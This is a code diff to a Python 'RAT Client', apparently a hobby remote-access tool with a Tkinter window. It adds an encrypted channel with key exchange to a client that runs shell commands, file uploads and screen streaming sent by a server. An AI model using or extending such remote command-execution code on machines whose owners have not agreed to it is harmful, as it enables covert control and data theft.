@@ -9,12 +9,17 @@ import platform
 import shutil
 import tkinter as tk
 from tkinter import messagebox
+from tkinter import ttk
+import tkinter.font as tkfont
 import threading
 import ctypes
 from ttkthemes import ThemedTk
 import hashlib
 import uuid
 from io import BytesIO
+
+# 导入客户端独立的加密模块
+from client_encryption import create_secure_socket
 
 # 发送加锁，避免多线程发送数据时内容交叉
 SEND_LOCK = threading.Lock()
@@ -350,17 +355,21 @@ def _take_screenshot_imagegrab():
 
 
 def reliable_send(sock, data_dict):
-    """将字典可靠地编码为JSON并附加换行符后发送（线程安全，优化版本）"""
+    """将字典可靠地编码为JSON并附加换行符后发送（线程安全，优化版本，支持加密）"""
     try:
-        # 使用更快的JSON编码选项
-        json_data = json.dumps(data_dict, separators=(',', ':'), ensure_ascii=False).encode('utf-8') + b'\n'
         with SEND_LOCK:
-            # 设置TCP_NODELAY以减少延迟
-            try:
-                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            except:
-                pass  # 忽略设置失败
-            sock.sendall(json_data)
+            # 检查是否为加密Socket
+            if hasattr(sock, 'send_encrypted'):
+                sock.send_encrypted(data_dict)
+            else:
+                # 回退到原始发送方式
+                json_data = json.dumps(data_dict, separators=(',', ':'), ensure_ascii=False).encode('utf-8') + b'\n'
+                # 设置TCP_NODELAY以减少延迟
+                try:
+                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                except:
+                    pass  # 忽略设置失败
+                sock.sendall(json_data)
     except socket.error as e:
         print(f"[错误] 发送数据时发生Socket错误: {e}")
         raise
@@ -1208,20 +1217,37 @@ COMMAND_HANDLERS = {
 
 def main_loop(server_ip, server_port, connection_code, ui_instance=None):
     """
-    客户端主函数，循环连接和处理命令。
+    客户端主函数，循环连接和处理命令（支持加密通信）。
     现在接受 server_ip、server_port、connection_code 和 ui_instance 作为参数。
     """
     buffer = b''
     state = {'cwd': os.getcwd(), 'socket': None}
     while True:
         client_socket = None
+        secure_conn = None
         try:
             print(f"[调试] 尝试连接服务器 {server_ip}:{server_port}...")
             client_socket = socket.socket()
             client_socket.connect((server_ip, server_port))
             print(f"[+] 已连接到服务器 {server_ip}:{server_port}")
+            
+            # 创建加密连接
+            try:
+                secure_conn = create_secure_socket(client_socket)
+                print("[+] 正在进行密钥交换...")
+                if secure_conn.perform_key_exchange():
+                    print("[+] 密钥交换完成，连接已加密")
+                    state['socket'] = secure_conn
+                else:
+                    print("[警告] 密钥交换失败，使用明文连接")
+                    secure_conn = client_socket
+                    state['socket'] = client_socket
+            except Exception as e:
+                print(f"[警告] 加密初始化失败，使用明文连接: {e}")
+                secure_conn = client_socket
+                state['socket'] = client_socket
+            
             state['cwd'] = os.getcwd()
-            state['socket'] = client_socket
 
             os_info = f"{platform.system()} {platform.release()}"
             
@@ -1243,7 +1269,7 @@ def main_loop(server_ip, server_port, connection_code, ui_instance=None):
                     "hostname": hostname,
                     "connection_code": connection_code  # 添加连接码到握手信息
                 }
-                reliable_send(client_socket, connection_info)
+                reliable_send(secure_conn, connection_info)
                 print(f"[调试] 已发送连接信息，包含连接码")
             except Exception as e:
                 print(f"[错误] 发送初始连接信息失败: {e}")
@@ -1257,40 +1283,69 @@ def main_loop(server_ip, server_port, connection_code, ui_instance=None):
             
             while not handshake_completed and time.time() < handshake_timeout:
                 try:
-                    part = client_socket.recv(4096)
-                    if not part:
-                        print("[调试] 服务器关闭了连接。")
-                        break
-                    buffer += part
+                    # 使用加密接收
+                    if hasattr(secure_conn, 'receive_encrypted'):
+                        messages = secure_conn.receive_encrypted()
+                        if messages is None:
+                            print("[调试] 服务器关闭了连接。")
+                            break
+                        elif not messages:
+                            continue  # 没有完整消息，继续等待
+                        
+                        # 处理接收到的消息
+                        for response in messages:
+                            # 处理握手确认
+                            if response.get('type') == 'hello_ack':
+                                if response.get('ok'):
+                                    mode = response.get('mode', 'unknown')
+                                    print(f"[+] 握手成功！模式: {mode}")
+                                    if ui_instance:
+                                        ui_instance.show_connection_success(mode)
+                                    handshake_completed = True
+                                    break
+                                else:
+                                    error = response.get('error', 'unknown_error')
+                                    print(f"[错误] 握手失败: {error}")
+                                    if ui_instance:
+                                        ui_instance.show_connection_error(error, error)
+                                    return  # 退出主循环，不重连
+                    else:
+                        # 回退到原始接收方式
+                        part = secure_conn.recv(4096)
+                        if not part:
+                            print("[调试] 服务器关闭了连接。")
+                            break
+                        buffer += part
+                        
+                        while b'\n' in buffer:
+                            message, buffer = buffer.split(b'\n', 1)
+                            try:
+                                response = json.loads(message.decode('utf-8'))
+                            except (json.JSONDecodeError, UnicodeDecodeError) as e:
+                                print(f"[错误] 解析握手响应失败: {e}")
+                                continue
+
+                            # 处理握手确认
+                            if response.get('type') == 'hello_ack':
+                                if response.get('ok'):
+                                    mode = response.get('mode', 'unknown')
+                                    print(f"[+] 握手成功！模式: {mode}")
+                                    if ui_instance:
+                                        ui_instance.show_connection_success(mode)
+                                    handshake_completed = True
+                                    break
+                                else:
+                                    error = response.get('error', 'unknown_error')
+                                    print(f"[错误] 握手失败: {error}")
+                                    if ui_instance:
+                                        ui_instance.show_connection_error(error, error)
+                                    return  # 退出主循环，不重连
+                        
                 except socket.error as e:
                     print(f"[错误] 接收握手响应时发生Socket错误: {e}")
                     if ui_instance:
                         ui_instance.show_connection_error('network_error', str(e))
                     break
-
-                while b'\n' in buffer:
-                    message, buffer = buffer.split(b'\n', 1)
-                    try:
-                        response = json.loads(message.decode('utf-8'))
-                    except (json.JSONDecodeError, UnicodeDecodeError) as e:
-                        print(f"[错误] 解析握手响应失败: {e}")
-                        continue
-
-                    # 处理握手确认
-                    if response.get('type') == 'hello_ack':
-                        if response.get('ok'):
-                            mode = response.get('mode', 'unknown')
-                            print(f"[+] 握手成功！模式: {mode}")
-                            if ui_instance:
-                                ui_instance.show_connection_success(mode)
-                            handshake_completed = True
-                            break
-                        else:
-                            error = response.get('error', 'unknown_error')
-                            print(f"[错误] 握手失败: {error}")
-                            if ui_instance:
-                                ui_instance.show_connection_error(error, error)
-                            return  # 退出主循环，不重连
                 
             if not handshake_completed:
                 print("[错误] 握手超时")
@@ -1303,100 +1358,153 @@ def main_loop(server_ip, server_port, connection_code, ui_instance=None):
             while True:
                 try:
                     print("[调试] 等待接收数据...")
-                    part = client_socket.recv(4096)
-                    if not part:
-                        print("[调试] 服务器关闭了连接。")
-                        break
-                    print(f"[调试] 接收到数据: {part}")
-                    buffer += part
+                    
+                    # 使用加密接收
+                    if hasattr(secure_conn, 'receive_encrypted'):
+                        messages = secure_conn.receive_encrypted()
+                        if messages is None:
+                            print("[调试] 服务器关闭了连接。")
+                            break
+                        elif not messages:
+                            continue  # 没有完整消息，继续等待
+                        
+                        # 处理接收到的消息
+                        for cmd_data in messages:
+                            print(f"[调试] 解析的命令数据: {cmd_data}")
+                            process_command(cmd_data, state, secure_conn)
+                    else:
+                        # 回退到原始接收方式
+                        part = secure_conn.recv(4096)
+                        if not part:
+                            print("[调试] 服务器关闭了连接。")
+                            break
+                        print(f"[调试] 接收到数据: {part}")
+                        buffer += part
+                        
+                        while b'\n' in buffer:
+                            message, buffer = buffer.split(b'\n', 1)
+                            print(f"[调试] 处理消息: {message}")
+                            try:
+                                cmd_data = json.loads(message.decode('utf-8'))
+                                print(f"[调试] 解析的命令数据: {cmd_data}")
+                                process_command(cmd_data, state, secure_conn)
+                            except (json.JSONDecodeError, UnicodeDecodeError) as e:
+                                print(f"[错误] 解析收到的消息失败: {e}")
+                                continue
+                        
                 except socket.error as e:
                     print(f"[错误] 接收数据时发生Socket错误: {e}")
                     break
 
-                while b'\n' in buffer:
-                    message, buffer = buffer.split(b'\n', 1)
-                    print(f"[调试] 处理消息: {message}")
-                    try:
-                        cmd_data = json.loads(message.decode('utf-8'))
-                        print(f"[调试] 解析的命令数据: {cmd_data}")
-                    except (json.JSONDecodeError, UnicodeDecodeError) as e:
-                        print(f"[错误] 解析收到的消息失败: {e}")
-                        continue
-
-                    action = cmd_data.get("action")
-                    if not action:
-                        try:
-                            reliable_send(client_socket, {"output": "错误: 命令缺少 'action' 字段"})
-                        except:
-                            pass
-                        continue
-
-                    print(f"[调试] 执行命令: {action}")
-                    try:
-                        handler = COMMAND_HANDLERS.get(action)
-                        if handler:
-                            if action == "upload_file_chunk":
-                                result = handler(cmd_data, state)
-                            else:
-                                arg = cmd_data.get("arg", "")
-                                result = handler(arg, state)
-                        else:
-                            result = handle_exec(
-                                action + (" " + cmd_data.get("arg", "") if cmd_data.get("arg") else ""), state)
-
-                        print(f"[调试] 命令执行结果: {result}")
-                        if isinstance(result, dict):
-                            reliable_send(client_socket, result)
-                        else:
-                            reliable_send(client_socket, {"output": str(result)})
-                        print("[调试] 结果已发送回服务器")
-                    except socket.error as e:
-                        print(f"[错误] 发送响应时Socket错误: {e}")
-                        break
-                    except Exception as e_proc:
-                        print(f"[错误] 处理命令时发生错误: {e_proc}")
-                        try:
-                            reliable_send(client_socket, {"output": f"处理命令时发生错误: {e_proc}"})
-                        except:
-                            break
-
-        except socket.error as e_sock:
-            print(f"[错误] 客户端 Socket 异常: {e_sock}")
+        except Exception as e:
+            print(f"[错误] 连接过程中发生错误: {e}")
             if ui_instance:
-                ui_instance.show_connection_error('network_error', str(e_sock))
-        except Exception as e_main:
-            print(f"[错误] 客户端主循环异常: {e_main}")
-            if ui_instance:
-                ui_instance.show_connection_error('unknown_error', str(e_main))
+                ui_instance.show_connection_error('connection_error', str(e))
         finally:
-            # 断开连接时确保停止屏幕流线程
-            _screen_stop_event.set()
-            try:
-                if _screen_thread and _screen_thread.is_alive():
-                    _screen_thread.join(timeout=1)
-            except Exception:
-                pass
-            if client_socket:
+            # 清理连接
+            if secure_conn and hasattr(secure_conn, 'close'):
+                try:
+                    secure_conn.close()
+                except:
+                    pass
+            elif client_socket:
                 try:
                     client_socket.close()
-                except Exception:
+                except:
                     pass
+            print("[调试] 连接已关闭，等待重连...")
+            time.sleep(5)  # 等待5秒后重连
 
-        buffer = b''
-        print("[调试] 5秒后尝试重新连接...")
-        time.sleep(5)
+
+def process_command(cmd_data, state, sock):
+    """处理单个命令"""
+    action = cmd_data.get("action")
+    if not action:
+        try:
+            reliable_send(sock, {"output": "错误: 命令缺少 'action' 字段"})
+        except:
+            pass
+        return
+
+    print(f"[调试] 执行命令: {action}")
+    try:
+        handler = COMMAND_HANDLERS.get(action)
+        if handler:
+            if action == "upload_file_chunk":
+                result = handler(cmd_data, state)
+            else:
+                arg = cmd_data.get("arg", "")
+                result = handler(arg, state)
+        else:
+            result = handle_exec(
+                action + (" " + cmd_data.get("arg", "") if cmd_data.get("arg") else ""), state)
+
+        print(f"[调试] 命令执行结果: {result}")
+        if isinstance(result, dict):
+            reliable_send(sock, result)
+        else:
+            reliable_send(sock, {"output": str(result)})
+        print("[调试] 结果已发送回服务器")
+    except socket.error as e:
+        print(f"[错误] 发送响应时Socket错误: {e}")
+    except Exception as e_proc:
+        print(f"[错误] 处理命令时发生错误: {e_proc}")
+        try:
+            reliable_send(sock, {"output": f"处理命令时发生错误: {e_proc}"})
+        except:
+            pass
 
 
 class ClientUI(ThemedTk):  # 使用 ThemedTk 替代 tk.Tk
     def __init__(self):
-        super().__init__(theme="equilux")  # 选择一个好看的主题，例如 "equilux"
-        self.title("RAT Client Configuration")
-        self.geometry("400x250")  # 稍微加大窗口
-        self.resizable(False, False)  # 禁止调整窗口大小
+        # 默认使用浅色主题，支持在菜单中切换
+        super().__init__(theme="arc")
+        self.title("RAT Client")
+        self.geometry("440x280")
+        self.resizable(False, False)
 
-        # 定义字体
-        self.font_large = ("Helvetica", 12)
-        self.font_button = ("Helvetica", 12, "bold")
+        # 选择更贴近苹果风格的字体（存在则用），否则回退
+        try:
+            families = set(tkfont.families())
+        except Exception:
+            families = set()
+        if "SF Pro Text" in families:
+            base_font = "SF Pro Text"
+        elif "Segoe UI" in families:
+            base_font = "Segoe UI"
+        else:
+            base_font = "Helvetica"
+
+        self.font_title = (base_font, 16, "bold")
+        self.font_large = (base_font, 12)
+        self.font_button = (base_font, 12, "bold")
+
+        # 统一样式（ttk）
+        self.style = ttk.Style(self)
+        try:
+            self.style.theme_use("arc")
+        except Exception:
+            pass
+        self.style.configure("Title.TLabel", font=self.font_title)
+        self.style.configure("FormLabel.TLabel", font=self.font_large)
+        self.style.configure("FormEntry.TEntry", font=self.font_large)
+        self.style.configure("Status.TLabel", font=self.font_large)
+        self.style.configure("Accent.TButton", font=self.font_button, padding=(10, 8), relief="flat")
+        # 在部分主题下，foreground/background可能不完全生效，但尽量设置
+        self.style.configure("Accent.TButton", foreground="#ffffff", background="#0A84FF")
+        self.style.map("Accent.TButton",
+                       foreground=[("active", "#ffffff"), ("!disabled", "#ffffff")])
+
+        # 菜单：浅色/深色主题切换
+        menubar = tk.Menu(self)
+        view_menu = tk.Menu(menubar, tearoff=0)
+        view_menu.add_radiobutton(label="浅色", command=lambda: self.switch_theme("arc"))
+        view_menu.add_radiobutton(label="深色", command=lambda: self.switch_theme("equilux"))
+        menubar.add_cascade(label="外观", menu=view_menu)
+        self.config(menu=menubar)
+
+        # 连接码显示控制
+        self.show_code_var = tk.BooleanVar(value=False)
 
         self.create_widgets()
         self.connection_thread = None
@@ -1404,32 +1512,56 @@ class ClientUI(ThemedTk):  # 使用 ThemedTk 替代 tk.Tk
         # 绑定回车键事件
         self.bind('<Return>', lambda event=None: self.start_connection())
 
+    def switch_theme(self, name: str):
+        try:
+            # ThemedTk提供set_theme方法
+            self.set_theme(name)
+        except Exception:
+            try:
+                ttk.Style().theme_use(name)
+            except Exception:
+                pass
+
     def create_widgets(self):
-        main_frame = tk.Frame(self, padx=25, pady=25)
+        main_frame = ttk.Frame(self, padding=(24, 24, 24, 16))
         main_frame.pack(fill="both", expand=True)
 
-        tk.Label(main_frame, text="服务端IP:", font=self.font_large).grid(row=0, column=0, sticky="w", pady=10)
-        self.ip_entry = tk.Entry(main_frame, font=self.font_large)
+        # 标题
+        title = ttk.Label(main_frame, text="RAT Client", style="Title.TLabel")
+        title.grid(row=0, column=0, columnspan=2, sticky="w", pady=(0, 12))
+
+        ttk.Label(main_frame, text="服务端IP:", style="FormLabel.TLabel").grid(row=1, column=0, sticky="w", pady=8)
+        self.ip_entry = ttk.Entry(main_frame, style="FormEntry.TEntry")
         self.ip_entry.insert(0, "192.168.242.102")
-        self.ip_entry.grid(row=0, column=1, pady=10, sticky="ew")
+        self.ip_entry.grid(row=1, column=1, pady=8, sticky="ew")
 
-        tk.Label(main_frame, text="服务端端口:", font=self.font_large).grid(row=1, column=0, sticky="w", pady=10)
-        self.port_entry = tk.Entry(main_frame, font=self.font_large)
+        ttk.Label(main_frame, text="服务端端口:", style="FormLabel.TLabel").grid(row=2, column=0, sticky="w", pady=8)
+        self.port_entry = ttk.Entry(main_frame, style="FormEntry.TEntry")
         self.port_entry.insert(0, "2383")
-        self.port_entry.grid(row=1, column=1, pady=10, sticky="ew")
+        self.port_entry.grid(row=2, column=1, pady=8, sticky="ew")
 
-        tk.Label(main_frame, text="连接码:", font=self.font_large).grid(row=2, column=0, sticky="w", pady=10)
-        self.connection_code_entry = tk.Entry(main_frame, font=self.font_large, show="*")
-        self.connection_code_entry.grid(row=2, column=1, pady=10, sticky="ew")
+        ttk.Label(main_frame, text="连接码:", style="FormLabel.TLabel").grid(row=3, column=0, sticky="w", pady=8)
+        self.connection_code_entry = ttk.Entry(main_frame, style="FormEntry.TEntry", show="*")
+        self.connection_code_entry.grid(row=3, column=1, pady=8, sticky="ew")
 
-        self.connect_button = tk.Button(main_frame, text="Connect", command=self.start_connection,
-                                        font=self.font_button, relief="groove")
-        self.connect_button.grid(row=3, column=0, columnspan=2, pady=15, sticky="ew")
+        # 显示连接码切换
+        show_code = ttk.Checkbutton(main_frame, text="显示连接码", variable=self.show_code_var, command=self.toggle_connection_code_visibility)
+        show_code.grid(row=4, column=1, sticky="w", pady=(2, 10))
 
-        self.status_label = tk.Label(main_frame, text="Status: Not Connected", fg="#FF4C4C", font=self.font_large)
-        self.status_label.grid(row=4, column=0, columnspan=2)
+        self.connect_button = ttk.Button(main_frame, text="Connect", command=self.start_connection, style="Accent.TButton")
+        self.connect_button.grid(row=5, column=0, columnspan=2, pady=12, sticky="ew")
+
+        self.status_label = ttk.Label(main_frame, text="Status: Not Connected", style="Status.TLabel", foreground="#FF4C4C")
+        self.status_label.grid(row=6, column=0, columnspan=2, sticky="w", pady=(4, 0))
 
         main_frame.grid_columnconfigure(1, weight=1)
+
+    def toggle_connection_code_visibility(self):
+        try:
+            self.connection_code_entry.config(show="" if self.show_code_var.get() else "*")
+        except Exception:
+            # ttk.Entry 同样支持 show 属性，回退保护
+            pass
 
     def start_connection(self):
         self.ip = self.ip_entry.get().strip()
@@ -1445,7 +1577,7 @@ class ClientUI(ThemedTk):  # 使用 ThemedTk 替代 tk.Tk
             return
 
         self.connect_button["state"] = "disabled"
-        self.status_label.config(text="Status: Connecting...", fg="#FFA500")
+        self.status_label.config(text="Status: Connecting...", foreground="#FFA500")
 
         self.connection_thread = threading.Thread(target=self.run_connection)
         self.connection_thread.daemon = True
@@ -1462,7 +1594,7 @@ class ClientUI(ThemedTk):  # 使用 ThemedTk 替代 tk.Tk
 
     def update_status(self, text, color):
         def _update():
-            self.status_label.config(text=f"Status: {text}", fg=color)
+            self.status_label.config(text=f"Status: {text}", foreground=color)
             if text.startswith("Connection Failed") or text.startswith("Authentication Failed"):
                 self.connect_button["state"] = "normal"
         
